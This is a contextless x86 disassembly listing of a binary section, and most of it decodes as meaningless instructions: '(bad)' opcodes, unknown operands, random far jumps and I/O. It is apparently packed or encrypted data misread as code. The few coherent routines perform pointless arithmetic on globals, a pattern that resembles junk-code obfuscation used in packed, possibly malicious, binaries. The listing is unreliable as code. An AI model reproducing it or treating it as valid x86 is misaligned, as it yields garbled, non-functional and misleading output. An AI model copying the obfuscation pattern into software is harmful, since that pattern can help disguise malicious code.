  406132:	(bad)  
  406133:	adc    dl,dh
  406135:	push   ebp
  406136:	loop   0x40618d
  406138:	xchg   BYTE PTR [ebx-0x2963949d],ch
  40613e:	cs loope 0x406100
  406141:	or     al,0x4e
  406143:	fucomip st,st(1)
  406145:	push   ds
  406146:	push   esp
  406147:	sub    dh,BYTE PTR [ebx-0xe]
  40614a:	sub    eax,0x133b5089
  40614f:	fcomp  DWORD PTR [edi+0x61]
  406152:	push   esp
  406153:	xor    DWORD PTR [edi-0x6a],ecx
  406156:	inc    edi
  406157:	fisttp QWORD PTR [eax]
  406159:	in     eax,0x2d
  40615b:	dec    eax
  40615c:	arpl   sp,ax
  40615e:	xchg   edx,eax
  40615f:	(bad)  
  406160:	add    eax,0x90df0957
  406165:	int    0x5f
  406167:	fwait
  406168:	mov    ah,0xfa
  40616a:	lods   eax,DWORD PTR ds:[esi]
  40616b:	pop    ds
  40616c:	mov    dh,0x2
  40616e:	adc    cl,BYTE PTR [ebx-0x127669d5]
  406174:	sub    dl,BYTE PTR [ebx-0xd]
  406177:	mov    al,ds:0x12f330b2
  40617c:	fisubr DWORD PTR [ebx-0x3a]
  40617f:	jmp    0x406186
  406181:	jmp    0x406148
  406183:	pop    ebx
  406184:	adc    esp,DWORD PTR [eax+0x79dcdb3e]
  40618a:	cmp    ah,BYTE PTR [ecx+edi*8-0x34bc464c]
  406191:	adc    al,0x61
  406193:	add    esp,DWORD PTR [ebx*8-0x1f897d34]
  40619a:	test   DWORD PTR [edi-0x15b6de66],0x8f1b04bf
  4061a4:	retf   0xada0
  4061a7:	or     BYTE PTR ds:0x713255af,bh
  4061ad:	lock fild WORD PTR [ebx-0x47a692aa]
  4061b4:	fnstenv [eax+ebx*1+0x413eebb]
  4061bb:	dec    esp
  4061bc:	xchg   ebx,eax
  4061bd:	mov    WORD PTR [ebx+0x6a],fs
  4061c0:	push   ebx
  4061c1:	outs   dx,BYTE PTR ds:[esi]
  4061c2:	(bad)  
  4061c3:	mov    esp,0x72f15d10
  4061c8:	dec    esi
  4061c9:	xchg   esi,eax
  4061ca:	xchg   DWORD PTR [eax],esi
  4061cc:	cmp    edi,ebp
  4061ce:	arpl   WORD PTR [ebx+0x40],si
  4061d1:	mov    ch,0x62
  4061d3:	repnz ins BYTE PTR es:[edi],dx
  4061d5:	jmp    0x40621e
  4061d7:	and    edi,edi
  4061d9:	fisub  WORD PTR [esi+0x32d15a42]
  4061df:	or     DWORD PTR [edi+0x2d],esp
  4061e2:	xor    eax,0x44e9cba6
  4061e7:	cmc    
  4061e8:	mov    edi,0xcfb9d14c
  4061ed:	add    al,0x80
  4061ef:	lock xor al,0xe8
  4061f2:	sbb    DWORD PTR ds:0x1d5169e1,esp
  4061f8:	and    DWORD PTR [ecx-0x5a],esp
  4061fb:	adc    eax,0xf8e5959f
  406200:	leave  
  406201:	push   ebp
  406202:	cwde   
  406203:	scas   eax,DWORD PTR es:[edi]
  406204:	mov    DWORD PTR [esi+ecx*8-0x165e6aff],esi
  40620b:	fisubr DWORD PTR [eax]
  40620d:	pop    ss
  40620e:	mov    cl,0xfd
  406210:	test   BYTE PTR [esi],cl
  406212:	adc    BYTE PTR [edx+0x6e1ef274],0x8
  406219:	test   BYTE PTR ds:[edi],bl
  40621c:	fs jmp 0xe9cf:0xde4f7df7
  406224:	loope  0x406273
  406226:	(bad)  
  406227:	jle    0x4061fc
  406229:	mov    eax,0x5fdfa5ea
  40622e:	mov    al,ds:0x7d33b2f1
  406233:	and    dh,ch
  406235:	je     0x40626d
  406237:	cs cmp al,0x1a
  40623a:	stc    
  40623b:	cmp    bh,BYTE PTR [edx-0x74]
  40623e:	(bad)  
  40623f:	mov    edx,fs
  406241:	adc    al,0x74
  406243:	sti    
  406244:	aam    0xeb
  406246:	ss jl  0x4062ad
  406249:	sbb    edx,DWORD PTR [edx]
  40624b:	aas    
  40624c:	lds    ax,DWORD PTR ds:0x4a017fa1
  406253:	jl     0x406265
  406255:	cdq    
  406256:	rcl    esp,0x6f
  406259:	add    eax,0x48dfa564
  40625e:	push   ebp
  40625f:	jp     0x406292
  406261:	and    ecx,edi
  406263:	shr    DWORD PTR [ebx],cl
  406265:	out    0x2d,al
  406267:	mov    ebx,0x44adf4a7
  40626c:	adc    BYTE PTR [edi+0x50],al
  40626f:	das    
  406270:	mov    dl,0x77
  406272:	xchg   ecx,eax
  406273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406274:	lahf   
  406275:	jecxz  0x406241
  406277:	and    eax,0x20993e7c
  40627c:	pop    edx
  40627d:	ja     0x4062ac
  40627f:	aam    0x86
  406281:	sar    DWORD PTR ds:0x370eb61f,1
  406287:	pop    es
  406288:	bound  edi,QWORD PTR [esi+0x1b]
  40628b:	repz xchg ecx,eax
  40628d:	dec    edx
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	inc    edi
  40632f:	scas   eax,DWORD PTR es:[edi]
  406330:	fs dec esi
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x40635b
  40633b:	outs   dx,DWORD PTR ds:[esi]
  40633c:	imul   edi,DWORD PTR [edx-0x4],0xedaa4c19
  406343:	aas    
  406344:	adc    BYTE PTR [esi+0x43],0xf8
  406348:	mov    esi,0x53b350f1
  40634d:	add    al,dl
  40634f:	mov    DWORD PTR [ebp-0x6a16f4a4],esi
  406355:	and    BYTE PTR [eax+0x6e],bh
  406358:	cmp    cl,BYTE PTR [eax+0x7dc7c654]
  40635e:	dec    ecx
  40635f:	dec    ebx
  406360:	and    cl,dh
  406362:	das    
  406363:	ds popa 
  406365:	xchg   ebp,eax
  406366:	inc    edx
  406367:	out    dx,al
  406368:	mov    DWORD PTR [ecx-0x284c6fdc],ebp
  40636e:	test   eax,0x68d51f29
  406373:	xchg   esi,eax
  406374:	aaa    
  406375:	mov    ch,0x2a
  406377:	or     dh,dl
  406379:	or     DWORD PTR [eax-0x69],esp
  40637c:	and    eax,DWORD PTR [esi-0x45ed467d]
  406382:	sar    BYTE PTR [esi],0x13
  406385:	jo     0x406347
  406387:	xlat   BYTE PTR ds:[ebx]
  406388:	repz aad 0xf8
  40638b:	fidiv  WORD PTR [edi]
  40638d:	sbb    BYTE PTR [eax*1+0x6d9db23b],ah
  406394:	xor    dl,bl
  406396:	mov    dh,0xaa
  406398:	call   0xd5926c8a
  40639d:	mov    al,BYTE PTR [edi-0x619f3256]
  4063a3:	pop    edx
  4063a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a5:	das    
  4063a6:	jb     0x4063eb
  4063a8:	es push 0xfffffffe
  4063ab:	inc    ecx
  4063ac:	dec    edi
  4063ad:	pop    ss
  4063ae:	dec    ecx
  4063af:	sub    ebp,edi
  4063b1:	ret    
  4063b2:	ins    BYTE PTR es:[edi],dx
  4063b3:	in     eax,0x0
  4063b5:	jecxz  0x4063b1
  4063b7:	out    0x2d,eax
  4063b9:	enter  0xd0bb,0x19
  4063bd:	mov    ch,BYTE PTR [esi]
  4063bf:	dec    esi
  4063c0:	mov    al,ds:0xbddf4361
  4063c5:	or     al,0xaa
  4063c7:	cmc    
  4063c8:	leave  
  4063c9:	or     esi,edi
  4063cb:	and    dh,BYTE PTR [edx-0x47]
  4063ce:	rcr    cl,1
  4063d0:	scas   eax,DWORD PTR es:[edi]
  4063d1:	xchg   edx,eax
  4063d2:	jo     0x4063b8
  4063d4:	stc    
  4063d5:	test   DWORD PTR [edi+0x1b813e1e],ecx
  4063db:	stos   BYTE PTR es:[edi],al
  4063dc:	ror    DWORD PTR [edx+0x19],0x69
  4063e0:	out    dx,al
  4063e1:	adc    bl,BYTE PTR [ecx+esi*2]
  4063e4:	ja     0x406427
  4063e6:	adc    al,0x35
  4063e8:	popa   
  4063e9:	and    dl,dh
  4063eb:	dec    edi
  4063ec:	popf   
  4063ed:	jecxz  0x40640e
  4063ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063f0:	jecxz  0x4063dc
  4063f2:	xchg   esp,eax
  4063f3:	fsub   QWORD PTR [edx]
  4063f5:	(bad)  
  4063f6:	and    DWORD PTR [eax],esi
  4063f8:	push   esp
  4063f9:	cmp    eax,0xf43be2a7
  4063fe:	sar    edx,0xa3
  406401:	cmp    eax,0xec7fc94f
  406406:	add    eax,DWORD PTR [ebp+ebp*1+0xc]
  40640a:	jo     0x40642a
  40640c:	hlt    
  40640d:	adc    al,0x70
  40640f:	out    dx,al
  406410:	pop    es
  406411:	retf   
  406412:	leave  
  406413:	lea    edx,[ebp+ecx*4+0x30]
  406417:	and    ebx,DWORD PTR [ebx]
  406419:	or     al,0x5e
  40641b:	cs ret 0xe235
  40641f:	(bad)  
  406420:	popaw  
  406422:	mov    WORD PTR [esi+0x8],?
  406425:	out    dx,al
  406426:	mov    ebx,0xf3b8e577
  40642b:	pusha  
  40642c:	rcr    DWORD PTR [esp+edi*2],1
  40642f:	lahf   
  406430:	in     eax,dx
  406431:	and    ah,BYTE PTR [ebp+0x67]
  406434:	in     al,0xb0
  406436:	pop    edi
  406437:	pusha  
  406438:	data16 adc al,0xe2
  40643b:	sub    DWORD PTR [ebx+esi*2],ebx
  40643e:	in     eax,0x9e
  406440:	sbb    eax,0x5c4e28b1
  406445:	adc    eax,0x2889444f
  40644a:	xor    ah,BYTE PTR [eax-0x62821534]
  406450:	call   0x1296e488
  406455:	inc    ebx
  406456:	test   al,0xa
  406458:	stos   BYTE PTR es:[edi],al
  406459:	sahf   
  40645a:	lds    ebp,FWORD PTR [edi+0x38]
  40645d:	stos   DWORD PTR es:[edi],eax
  40645e:	in     eax,0x16
  406460:	(bad)  
  406462:	mov    ds:0x17fab3a4,eax
  406467:	add    dl,BYTE PTR [esi]
  406469:	jle    0x4064d9
  40646b:	mov    cl,0x60
  40646d:	retf   
  40646e:	lea    edi,[ebx]
  406470:	fwait
  406471:	imul   eax,DWORD PTR [ecx-0x44],0xffffff8a
  406475:	push   ebx
  406476:	cmp    al,0xd3
  406478:	int    0xe5
  40647a:	arpl   WORD PTR [ebx-0x7427b0aa],cx
  406480:	mov    ebp,0x23d8139c
  406485:	int3   
  406486:	cmp    eax,0x69001ec
  40648b:	ins    BYTE PTR es:[edi],dx
  40648c:	and    ch,dh
  40648e:	in     al,dx
  40648f:	mov    ebp,0xe9231f75
  406494:	div    BYTE PTR [edi+0x7e]
  406497:	sahf   
  406498:	jmp    0xeff9:0x983008dc
  40649f:	pop    es
  4064a0:	ret    0xaa9e
  4064a3:	dec    eax
  4064a4:	sar    BYTE PTR [eax-0x236d0c9a],1
  4064aa:	int    0x9e
  4064ac:	add    bl,BYTE PTR [ebp+0x52]
  4064af:	ffree  st(3)
  4064b1:	sbb    edx,eax
  4064b3:	jae    0x406458
  4064b5:	outs   dx,DWORD PTR ds:[esi]
  4064b6:	jge    0x4064f8
  4064b8:	ds jle 0x4064a5
  4064bb:	sub    DWORD PTR [esi+0x67],ecx
  4064be:	mov    BYTE PTR [ecx],al
  4064c0:	xor    al,0x72
  4064c2:	ret    
  4064c3:	sub    ch,ah
  4064c5:	je     0x40653e
  4064c7:	int    0xf0
  4064c9:	pop    esp
  4064ca:	stos   DWORD PTR es:[edi],eax
  4064cb:	ret    0x8cd5
  4064ce:	js     0x4064df
  4064d0:	test   al,0xc7
  4064d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d3:	jmp    0x6ff1d209
  4064d8:	scas   eax,DWORD PTR es:[edi]
  4064d9:	loopne 0x4064a6
  4064db:	in     eax,dx
  4064dc:	inc    edi
  4064dd:	mov    edi,0xb3b6f3d1
  4064e2:	mov    bl,0x5e
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	add    edi,DWORD PTR [ecx-0x6d]
  406569:	aas    
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	sbb    eax,DWORD PTR [edi]
  406574:	js     0x40651e
  406576:	inc    eax
  406577:	repnz inc ebp
  406579:	repz jecxz 0x406523
  40657c:	jmp    0x1805:0x124c30fe
  406583:	inc    edx
  406584:	or     ch,ah
  406586:	fsubr  QWORD PTR [ebx+0x75]
  406589:	pop    edi
  40658a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40658b:	frstor [eax-0x22]
  40658e:	add    DWORD PTR gs:[eax],ecx
  406591:	jle    0x4065e3
  406593:	dec    ecx
  406594:	loopne 0x4065cb
  406596:	sub    al,0x63
  406598:	js     0x4065dd
  40659a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40659b:	or     ecx,DWORD PTR [eax]
  40659d:	(bad)  
  40659e:	adc    BYTE PTR [ebp-0x29],bl
  4065a1:	stc    
  4065a2:	xor    BYTE PTR [ebp-0x52],0x67
  4065a6:	mov    eax,ds:0xd99f5755
  4065ab:	addr16 and al,0xf1
  4065ae:	shl    BYTE PTR [edi-0x46],1
  4065b1:	nop
  4065b2:	or     BYTE PTR [edx],0x43
  4065b5:	push   esi
  4065b6:	nop
  4065b7:	dec    edx
  4065b8:	mov    ah,bl
  4065ba:	imul   ebp,ecx,0xffffff91
  4065bd:	mov    ebp,0x6357bc93
  4065c2:	scas   eax,DWORD PTR es:[edi]
  4065c3:	dec    edi
  4065c4:	mov    eax,ds:0x85c32d64
  4065c9:	inc    eax
  4065ca:	xchg   edi,eax
  4065cb:	inc    eax
  4065cc:	frstor [esi+0x67]
  4065cf:	sti    
  4065d0:	sub    bl,BYTE PTR [ebp+0x64bad9dd]
  4065d6:	and    DWORD PTR [edi],edx
  4065d8:	aad    0xd
  4065da:	sub    eax,0xd8503ff5
  4065df:	shl    ah,0x9f
  4065e2:	cld    
  4065e3:	les    esi,FWORD PTR [esi]
  4065e5:	or     al,bh
  4065e7:	out    dx,al
  4065e8:	push   eax
  4065e9:	rol    al,cl
  4065eb:	jl     0x406664
  4065ed:	(bad)  [edx]
  4065ef:	pop    edi
  4065f0:	sbb    BYTE PTR [edi-0x2b53489e],cl
  4065f6:	jne    0x406631
  4065f8:	xchg   BYTE PTR [edx-0x4fd9db60],dl
  4065fe:	repnz fimul DWORD PTR [edi]
  406601:	imul   edx,DWORD PTR [ebx+ebp*8-0x69b61fa9],0xee60199a
  40660c:	fwait
  40660d:	sub    BYTE PTR [ebx+ebp*4+0x2216c8b9],bl
  406614:	jmp    0x97c8:0x1c51efdd
  40661b:	int    0x71
  40661d:	push   cs
  40661e:	add    eax,0xa5fd4916
  406623:	cmp    eax,0xab45c37d
  406628:	dec    ebx
  406629:	mov    ds:0x5048b0e2,eax
  40662e:	inc    ebp
  40662f:	jmp    0x772511c8
  406634:	rol    DWORD PTR [ecx-0x5e],1
  406637:	stos   DWORD PTR es:[edi],eax
  406638:	fdiv   QWORD PTR [edx-0x1e7a73a2]
  40663e:	and    ebp,0x19bad1e2
  406644:	imul   ecx,DWORD PTR [esi+eax*1+0x52],0x8c1d01cd
  40664c:	(bad)  
  40664d:	pop    edx
  40664e:	pop    ebp
  40664f:	mov    WORD PTR [edx+0x39],?
  406652:	inc    eax
  406653:	cmc    
  406654:	clc    
  406655:	dec    ebp
  406656:	mov    ?,WORD PTR [ebx]
  406658:	jnp    0x406663
  40665a:	icebp  
  40665b:	lahf   
  40665c:	std    
  40665d:	or     BYTE PTR [ebp-0x1f],bh
  406660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406661:	out    dx,al
  406662:	sub    eax,0x84d698
  406667:	inc    eax
  406668:	clc    
  406669:	sti    
  40666a:	mov    ebp,0xc899e3e2
  40666f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406670:	sbb    ah,BYTE PTR [edx+edx*8+0x2]
  406674:	retf   0xb048
  406677:	mov    al,ds:0x9026957b
  40667c:	in     al,dx
  40667d:	hlt    
  40667e:	dec    ebx
  40667f:	int    0x33
  406681:	ins    DWORD PTR es:[edi],dx
  406682:	push   ebx
  406683:	inc    esi
  406685:	push   ss
  406686:	jbe    0x406706
  406688:	xchg   edx,eax
  406689:	addr16 push edx
  40668b:	ins    BYTE PTR es:[edi],dx
  40668c:	into   
  40668d:	out    0xcd,al
  40668f:	add    DWORD PTR [ecx-0x62491008],esi
  406695:	adc    al,0x8c
  406697:	add    BYTE PTR [edx+0x3c50f601],0x29
  40669e:	outs   dx,BYTE PTR ds:[esi]
  40669f:	jnp    0x4066a6
  4066a1:	mov    ebx,0xbc7798e7
  4066a6:	inc    esp
  4066a7:	sub    dh,ah
  4066a9:	xor    BYTE PTR [ebx],dh
  4066ab:	rcl    BYTE PTR [edi-0x19],cl
  4066ae:	neg    DWORD PTR [ebx-0x5f]
  4066b1:	stos   DWORD PTR es:[edi],eax
  4066b2:	sbb    BYTE PTR [ebp+0x24],0x50
  4066b6:	xlat   BYTE PTR ds:[ebx]
  4066b7:	stc    
  4066b8:	es sbb al,0xd2
  4066bb:	or     al,0xee
  4066bd:	in     al,dx
  4066be:	add    eax,0xfe249b7d
  4066c3:	test   DWORD PTR ss:[eax],ebp
  4066c6:	cwde   
  4066c7:	dec    esp
  4066c8:	sbb    DWORD PTR [eax+0x60],edx
  4066cb:	out    dx,eax
  4066cc:	or     bl,BYTE PTR [ebp+0xc]
  4066cf:	pop    eax
  4066d0:	or     DWORD PTR [edi-0x61],0xffffffc5
  4066d4:	mov    ch,0x4a
  4066d6:	data16 jbe 0x40669b
  4066d9:	imul   esp,DWORD PTR [eax-0x2aa4d114],0x2
  4066e0:	inc    esp
  4066e1:	mov    ebp,DWORD PTR [ecx+esi*2-0x72]
  4066e5:	repz jae 0x4066f3
  4066e8:	sti    
  4066e9:	jle    0x406705
  4066eb:	loop   0x40670f
  4066ed:	icebp  
  4066ee:	scas   eax,DWORD PTR es:[edi]
  4066ef:	rol    BYTE PTR [edx],cl
  4066f1:	push   ecx
  4066f2:	adc    al,0xf
  4066f4:	dec    esi
  4066f5:	inc    edi
  4066f6:	jmp    0x40672d
  4066f8:	std    
  4066f9:	mov    esp,0x7a4358fe
  4066fe:	aas    
  4066ff:	dec    eax
  406700:	cmp    edx,esp
  406702:	sbb    al,0x4
  406704:	mov    WORD PTR [ebp+0x260d0a7f],es
  40670a:	mov    eax,ds:0x265e5f2
  40670f:	mov    dl,0x1e
  406711:	ja     0x4066e8
  406713:	mov    ah,0x9f
  406715:	outs   dx,BYTE PTR ds:[esi]
  406716:	js     0x406762
  406718:	adc    BYTE PTR [edx-0x328b060b],0xdb
  40671f:	add    eax,0xeacc0003
  406724:	xor    al,0xb3
  406726:	or     edx,0x3
  406729:	xchg   esi,eax
  40672a:	mov    bl,0xb7
  40672c:	lahf   
  40672d:	clc    
  40672e:	call   0x73843322
  406733:	pop    esi
  406734:	cmp    ah,dl
  406736:	pushf  
  406737:	ficom  WORD PTR [ebx]
  406739:	shl    BYTE PTR [ecx],cl
  40673b:	xchg   ecx,eax
  40673c:	fldcw  WORD PTR [ecx+0x2d1a9cb4]
  406742:	scas   al,BYTE PTR es:[edi]
  406743:	mov    DWORD PTR [ebx+edx*8-0x2536b051],ebp
  40674a:	sbb    BYTE PTR ds:0x2c8ed952,0x94
  406751:	xchg   DWORD PTR [edi-0x18],ecx
  406754:	jae    0x4066e0
  406756:	es in  eax,0x72
  406759:	jb     0x406743
  40675b:	in     al,0xe
  40675d:	mov    esi,0x60d26c6a
  406762:	push   ebx
  406763:	jle    0x406710
  406765:	scas   al,BYTE PTR es:[edi]
  406766:	lods   eax,DWORD PTR ds:[esi]
  406767:	in     al,dx
  406768:	aaa    
  406769:	cmp    eax,ecx
  40676b:	xor    ch,dh
  40676d:	or     ch,dl
  40676f:	sub    bl,BYTE PTR [eax+0x2eb3e90b]
  406775:	add    eax,0xfabbf99f
  40677a:	xchg   edi,edi
  40677c:	loop   0x40672d
  40677e:	adc    al,0x2c
  406780:	sbb    eax,0x9b5fffa8
  406785:	ds in  al,0xf2
  406788:	pop    esi
  406789:	fistp  QWORD PTR [ebp+0x6b2e8d07]
  40678f:	outs   dx,DWORD PTR ds:[esi]
  406790:	daa    
  406791:	xchg   edi,eax
  406792:	inc    ebp
  406793:	mov    al,ds:0xd32b319
  406798:	out    0x40,eax
  40679a:	arpl   WORD PTR [edi-0x11],dx
  40679d:	push   0x2bce4376
  4067a2:	loop   0x4067ec
  4067a4:	pop    ecx
  4067a5:	sbb    DWORD PTR [edi-0x49],ebp
  4067a8:	stos   DWORD PTR es:[edi],eax
  4067a9:	adc    al,0x34
  4067ab:	and    BYTE PTR [ebp+0x6d],al
  4067ae:	push   0x13d07a12
  4067b3:	mov    edi,0xcd83fc6e
  4067b8:	xor    ah,BYTE PTR ds:[edi-0x37bf13cf]
  4067bf:	js     0x406774
  4067c1:	or     BYTE PTR [ecx-0x1a],al
  4067c4:	addr16 shr bl,0x2e
  4067c8:	jmp    0x4067de
  4067ca:	test   edx,esi
  4067cc:	mov    esi,0x16af93b4
  4067d1:	not    BYTE PTR [edx-0x1005a520]
  4067d7:	js     0x4067b2
  4067d9:	mov    ds:0x4fab9c57,eax
  4067de:	fbstp  TBYTE PTR [ecx]
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	jge    0x4067c8
  406848:	mov    edx,DWORD PTR [esi-0x5b]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	pop    ebx
  406853:	retf   0x3016
  406856:	xchg   BYTE PTR [edi*8+0x6b7a5ea],dh
  40685d:	jno    0x406886
  40685f:	sub    bh,BYTE PTR [eax]
  406861:	pop    es
  406862:	mov    ah,0xa5
  406864:	xchg   esi,eax
  406865:	ja     0x406842
  406867:	and    al,ah
  406869:	rcl    ecx,1
  40686b:	cmp    eax,0x1cedb5ab
  406870:	adc    eax,0xcae7b112
  406875:	adc    DWORD PTR [eax+0x7833b560],ebp
  40687b:	cdq    
  40687c:	inc    ebx
  40687d:	inc    ebx
  40687e:	inc    ebp
  40687f:	dec    edi
  406880:	test   BYTE PTR [edx+0x7],dh
  406883:	mov    al,ds:0xccc739c9
  406888:	popa   
  406889:	popf   
  40688a:	add    ch,dh
  40688c:	mov    WORD PTR [esi-0x4],?
  40688f:	pop    ebp
  406890:	xor    eax,0x3d0a5207
  406895:	cmp    eax,0xb775f158
  40689a:	div    DWORD PTR [ebx]
  40689c:	shr    BYTE PTR [ebp+0x2bcba4ea],1
  4068a2:	ins    DWORD PTR es:[edi],dx
  4068a3:	in     al,dx
  4068a4:	mov    ch,0x0
  4068a6:	cmp    DWORD PTR [edi+0x1f1df645],ebx
  4068ac:	mov    ds:0x1cbad541,eax
  4068b1:	adc    ch,BYTE PTR [ebp-0x1b3a53c5]
  4068b7:	leave  
  4068b8:	jmp    0xe9da2ddf
  4068bd:	xchg   ebp,eax
  4068be:	mov    bl,0xd
  4068c0:	fcmovnbe st,st(2)
  4068c2:	imul   esp,DWORD PTR [ebx+0x18],0x3915a1d8
  4068c9:	or     edi,DWORD PTR [edx-0x7a882c8]
  4068cf:	clc    
  4068d0:	lock jno 0x406930
  4068d3:	rcl    DWORD PTR [ebp+0x69f0357b],1
  4068d9:	fsubr  st,st(7)
  4068db:	aaa    
  4068dc:	std    
  4068dd:	dec    eax
  4068de:	rcr    edx,cl
  4068e0:	dec    esp
  4068e1:	shr    dl,cl
  4068e3:	fist   DWORD PTR [edi]
  4068e5:	sub    ch,bh
  4068e7:	mov    ecx,0x11e6a8a8
  4068ec:	fwait
  4068ed:	adc    BYTE PTR [ecx-0x59e98bf1],al
  4068f3:	stc    
  4068f4:	popa   
  4068f5:	call   0x702e:0xc529fe34
  4068fc:	outs   dx,BYTE PTR ds:[esi]
  4068fd:	leave  
  4068fe:	scas   eax,DWORD PTR es:[edi]
  4068ff:	fistp  WORD PTR [esi]
  406901:	jg     0x4068a5
  406903:	fs push es
  406905:	pusha  
  406906:	xor    BYTE PTR [ebp+0x1b],ch
  406909:	mov    WORD PTR [ebp+0x3b],fs
  40690c:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40690e:	(bad)  
  40690f:	push   ss
  406910:	aam    0x8b
  406912:	add    bl,BYTE PTR ds:0x5f842fa1
  406918:	shr    esp,1
  40691a:	xchg   BYTE PTR [ecx],bl
  40691c:	pop    ecx
  40691d:	es leave 
  40691f:	enter  0x1f9e,0x43
  406923:	add    dl,dl
  406925:	pop    ecx
  406926:	sub    ah,BYTE PTR [esi-0x5]
  406929:	mov    esp,0x35b604c7
  40692e:	in     eax,dx
  40692f:	xor    DWORD PTR [edi+0x46],0xf916b206
  406936:	jmp    0x4068c5
  406938:	xor    bl,ah
  40693a:	push   ecx
  40693b:	aad    0xb9
  40693d:	scas   al,BYTE PTR es:[edi]
  40693e:	or     al,0x19
  406940:	inc    esp
  406941:	and    al,0x54
  406943:	pop    ecx
  406944:	ret    
  406945:	icebp  
  406946:	sbb    BYTE PTR [edx],0xa
  406949:	ret    0x65bc
  40694c:	mov    esp,0x7b8a1104
  406951:	add    BYTE PTR [ecx],al
  406953:	daa    
  406954:	fs push esi
  406956:	or     ebx,DWORD PTR [ebp+0x60]
  406959:	adc    bh,dh
  40695b:	(bad)  
  40695c:	out    dx,al
  40695d:	xchg   esi,ecx
  40695f:	(bad)  
  406961:	popa   
  406962:	cmp    al,0x7b
